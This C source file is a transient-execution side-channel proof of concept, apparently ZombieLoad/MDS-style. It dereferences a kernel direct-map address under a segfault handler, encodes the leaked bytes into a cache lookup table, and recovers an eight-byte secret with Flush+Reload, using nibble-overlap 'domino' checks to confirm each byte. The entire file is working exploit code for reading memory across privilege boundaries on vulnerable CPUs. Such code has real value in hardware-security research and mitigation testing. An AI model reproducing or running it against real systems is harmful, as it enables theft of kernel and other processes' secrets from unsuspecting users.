#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <memory.h>
#include <sys/mman.h>

#include "cacheutils.h"

#define FROM 1
#define TO 254
#define  SECRET_LEN 8
#define THRESHLOD 200

char __attribute__((aligned(4096))) mem[256 * 4096];
int hist[256];
unsigned char secret[SECRET_LEN+1] = {0};
unsigned char secret_with_crc[SECRET_LEN*2+1] = {0};

int recover(size_t index);

int main(int argc, char *argv[]) {
  // Initialize and flush LUT
  memset(mem, 0, sizeof(mem));

  for (size_t i = 0; i < 256; i++) {
    flush(mem + i * 4096);
  }

  // Get a valid page and its direct physical map address (i.e., a kernel mapping to the page)
  char *mapping = (char *)mmap(0, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  memset(mapping, 1, 4096);
  size_t paddr = get_physical_address((size_t)mapping);
  if (!paddr) {
    printf("[!] Could not get physical address! Did you start as root?\n");
    exit(1);
  }
  char *target = (char *)(get_direct_physical_map() + paddr);

  printf("[+] Kernel address: %p\n", target);

  // Calculate Flush+Reload threshold
  CACHE_MISS = detect_flush_reload_threshold();
  fprintf(stderr, "[+] Flush+Reload Threshold: %zu\n", CACHE_MISS);

  // setup signal handler
  signal(SIGSEGV, trycatch_segfault_handler);

  register size_t index = 0;
  while (index < SECRET_LEN*2) {
    while(1)
    {
      // Ensure the kernel mapping refers to a value not in the cache
      flush(mapping);

      // Dereference the kernel address and encode in LUT
      // Not in cache -> reads load buffer entry
      if (!setjmp(trycatch_buf))
      {
        // shift by 4 to get high domino byte
        register uint16_t shift4 = (index & 0x1)<<0x2;
        // shift by 12 to get low domino byte
        register uint16_t shift12 = (index & 0x1) << 0x3 | (index & 0x1) << 0x2;
        maccess(0);
        // get a short and take the byte or the domino byte depending on the index
        register uint16_t nibbles = *((uint16_t*) &target[index/2]);
        maccess(mem + 4096 * (((nibbles << shift4) | (nibbles >> shift12)) & 0xff));
      }
      if(recover(index))
        break;
    }
    ++index;
  }
  return 0;
}

int recover(size_t index)
{
  // Recover value from cache and update histogram
  int update = 0;
  for (size_t i = FROM; i <= TO; i++) {
    if (flush_reload((char *)mem + 4096 * i + index)) {
      hist[i]++;
      update = 1;
    }
  }

  // If new hit, display histogram
  if (update) {
    printf("\x1b[2J");
    printf("index: %lu crc?:%lu\n", index / 2, index % 2);
    int max = 1;
    int max_index = -1;
    for (int i = FROM; i <= TO; i++) {
      if (hist[i] > max)
      {
        max = hist[i];
        max_index = i;
      }
    }
    for (int i = FROM; i <= TO; i++) {
      if (hist[i] > THRESHLOD / 5)
      {
        printf("0x%02x: (%4d) ", i, hist[i]);
        for (int j = 0; j < hist[i] * 60 / max; j++)
        {
          printf("#");
        }
        printf("\n");
      }
    }
    // ######
    printf("[DEBUG]: ");
    for(int j = 0; j < index; j++)
    {
      printf("0x%x ", secret_with_crc[j]);
    }
    printf("\n");
    // #####
    printf("recovered: %s", secret);
    fflush(stdout);
    if(max > THRESHLOD)
    {
      secret_with_crc[index] = (char) max_index;
      if(index != 0)
      {
        // check domino's bytes: 0x_A and 0xA_ must match
        if ((secret_with_crc[index] >> 0x4) != (secret_with_crc[index-1] & 0xf))
          {
            // failed byte
            memset(hist, 0, 256 * sizeof(int));
            printf("\n");
            return 0;
          }
      }
      if(index%2==0)
        secret[index/2] = (char)max_index;
      printf("\rrecovered: %s\n", secret);
      memset(hist, 0, 256 * sizeof(int));
      return 1;
    }
    else
    {
      printf("\n");
      return 0;
    }
    
  }
  else
  {
    return 0;
  }
  
}
